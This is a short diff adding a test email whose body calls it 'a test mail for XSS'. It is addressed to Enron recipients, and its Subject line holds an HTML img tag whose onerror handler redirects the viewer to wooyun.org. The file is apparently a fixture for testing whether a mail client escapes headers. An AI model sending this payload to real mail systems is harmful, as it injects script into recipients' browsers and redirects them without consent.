@@ -1,0 +1,7 @@
+From: "Robert" <oem1992@arefor.com>
+To: tana.jones@enron.com, karen.lambert@enron.com, kelly.lombardi@enron.com
+Subject: <img onerror=window.location.href="http://www.wooyun.org" src="http://www.wooyun.org">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
